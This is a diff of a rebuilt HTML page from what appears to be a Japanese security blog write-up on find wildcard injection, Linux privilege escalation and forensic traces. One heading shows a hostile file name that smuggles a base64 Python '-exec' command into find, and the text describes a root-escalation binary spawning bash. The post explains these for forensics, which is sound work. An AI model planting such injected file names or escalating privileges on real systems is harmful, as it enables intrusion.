-<br/>
+<!-- raw HTML omitted -->
 <h4 id="varwwwhtmlimages--exec-python--c-execaw1略kqdecodebase64-">/var/www/html/images/* -exec python -c exec(&lsquo;aW1(略)KQ==&rsquo;.decode(&lsquo;base64&rsquo;)) ;</h4>
 <p>もはやネタ。<br>
 攻撃者は何回も実行されないように一回実行されたら削除しますが、当然痕跡としては残ります。<br>
 フォレンジック時、「-exec」を含むファイル/ディレクトリを探すといいかもしれません。</p>
-<br/>
+<!-- raw HTML omitted -->
 <h3 id="プロセス">プロセス</h3>
 <p>侵害調査時、万が一攻撃者が活動してて鉢合わせたらプロセスですぐにわかります。</p>
 <p>以下は「ps auxwf」の結果です。</p>
-<figure><img src="./forensics_ps.png"/>
+<figure>
+    <img src="./forensics_ps.png"/> 
 </figure>
 
 <p>以下の流れであることがひと目でわかりますね。</p>
@@ -794,8 +813,7 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
 <li>権限昇格用バイナリ ./w (root権限)</li>
 <li>./w が root 権限で bash を起動</li>
 </ol>
-<br/>
-攻撃者としては鉢合わせないように、常にnetstat(ss)やpsに目を光らせておく必要がありますね。
+<!-- raw HTML omitted -->
 <hr>
 <h2 id="コラムというか雑記">コラム（というか雑記）</h2>
 <p>find に対する Wildcard Injection の解説はどこよりも詳しく書けたんじゃないかな・・・</p>
@@ -817,7 +835,6 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
 <p>今回はAD侵害までいけず、Linux環境の権限昇格のところまででした。
 次こそADにいきたいですが、フォワーディングだけで終わりそう</p>
 <p>以上。</p>
-
                     </div>
                     
                     
@@ -918,13 +935,13 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
 
 
 <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
-
+    
 <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
 
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
 
+<script src="/js/mediumish.js"></script>
 
-<script src="https://www.shutingrz.com/js/mediumish.e4b90c58dfa15ac82caf2edfa01e5fd047e17bc15e6babe5c0e442a4407d0b25.js" integrity="sha256-5LkMWN&#43;hWsgsry7foB5f0Efhe8Fea6vlwORCpEB9CyU="></script>
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -937,5 +954,6 @@ if (!doNotTrack) {
 	ga('send', 'pageview');
 }
 </script>
+
     </body>
 </html>
